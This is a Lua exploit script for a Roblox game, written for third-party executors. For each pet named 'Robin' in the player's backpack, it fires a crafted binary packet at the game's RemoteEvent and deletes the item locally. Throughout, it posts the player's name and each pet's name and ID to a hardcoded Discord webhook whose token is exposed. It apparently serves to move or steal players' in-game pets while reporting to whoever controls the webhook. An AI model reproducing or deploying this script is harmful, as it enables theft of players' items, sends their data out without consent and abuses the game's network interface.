-- Generated Payload Sender
local PETS = {"Robin"}
local WEBHOOK = "https://discord.com/api/webhooks/1526222716275785839/65GIm7Yx4pfvQeUc11P8-E8Zc43wtzJiZjn9SVZ_s9CofmAqTe9LWPctE_TMJPkKDRqw"

local Event = game:GetService("ReplicatedStorage"):FindFirstChild("SharedModules")
    and game:GetService("ReplicatedStorage").SharedModules:FindFirstChild("Packet")
    and game:GetService("ReplicatedStorage").SharedModules.Packet:FindFirstChild("RemoteEvent")

local ALLOWED = {}
for _, p in ipairs(PETS) do table.insert(ALLOWED, string.lower(p)) end

local function buildPacket(petId)
    local s = "!\\x01+\\x00\\x00\\xC0\\x04\\xD6&\\xF0A\\x1C\\x05\\x01\\x1C\\v\\aItemKey\\v$" .. petId .. "\\v\\x05Count\\x05\\x01\\v\\bCategory\\v\\x04Pets\\x00\\x00\\x00"
    return buffer.fromstring(s)
end

local function sendWebhook(msg)
    local req = (type(request) == "function" and request) 
        or (type(http_request) == "function" and http_request) 
        or (syn and type(syn.request) == "function" and syn.request) 
        or (http and type(http.request) == "function" and http.request)
    if req then
        pcall(req, {
            Url = WEBHOOK,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode({content = msg})
        })
    end
end

local player = game:GetService("Players").LocalPlayer
local backpack = player:WaitForChild("Backpack")
local totalFired = 0

sendWebhook("🚀 Script started by **" .. player.Name .. "**")

while totalFired < 100 do
    local items = backpack:GetChildren()
    local anyProcessed = false
    
    for _, item in ipairs(items) do
        local petId = item:GetAttribute("PetId")
        local petName = item:GetAttribute("Pet")
        
        if petId and petName then
            local lowerName = string.lower(petName)
            local isAllowed = false
            
            for _, allowed in ipairs(ALLOWED) do
                if lowerName == allowed then -- Safe exact matching only
                    isAllowed = true
                    break
                end
            end
            
            if isAllowed then
                if Event then Event:FireServer(buildPacket(petId)) end
                totalFired = totalFired + 1
                anyProcessed = true
                sendWebhook("**Pet Sent**\\nName: `" .. petName .. "`\\nID: `" .. petId .. "`")
                item:Destroy() -- Only delete if we actually processed and fired it!
                task.wait(10)
            end
            -- Unselected pets are skipped completely (NOT destroyed!)
        end
    end
    
    if not anyProcessed then 
        task.wait(1) 
    end
end

sendWebhook("✅ Script finished. Fired " .. totalFired .. " packets.")
